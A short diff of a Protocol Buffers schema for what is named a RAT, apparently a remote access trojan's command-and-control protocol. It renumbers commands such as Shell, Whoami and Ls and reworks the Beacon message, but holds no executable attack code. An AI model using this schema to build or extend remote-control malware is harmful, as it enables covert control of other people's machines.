@@ -17,14 +17,15 @@ enum RATCommand {
         Hostname = 3;
         Ip = 4;
         Ls = 5;
-        Os = 6;
-        Quit = 7;
-        Shell = 8;
-        Whoami = 9;
+        None = 6;
+        Os = 7;
+        Quit = 8;
+        Shell = 9;
+        Whoami = 10;
     }
 
 message Beacon {
-    int32 last_received = 1;
+    uint32 requested_command = 1;
 }
 
 message CommandRequest {
